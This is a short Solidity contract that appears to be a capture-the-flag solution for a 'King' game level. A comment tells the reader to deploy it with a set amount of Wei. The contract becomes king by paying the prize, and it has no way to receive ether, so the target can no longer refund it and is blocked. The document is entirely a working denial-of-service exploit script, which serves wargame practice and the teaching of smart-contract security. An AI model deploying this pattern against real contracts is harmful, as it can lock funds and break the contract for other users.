/**
 * How to beat this level:
 * 1) Deploy KingHack and send 1000000000000000 Wei at deployment
 */

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {King} from "./King.sol";

error TransferFailed();

contract KingHack {
    constructor(address payable _target) payable {
        uint256 prize = King(_target).prize();
        (bool success,) = _target.call{value: prize}("");
        if (!success) revert TransferFailed();
    }
}
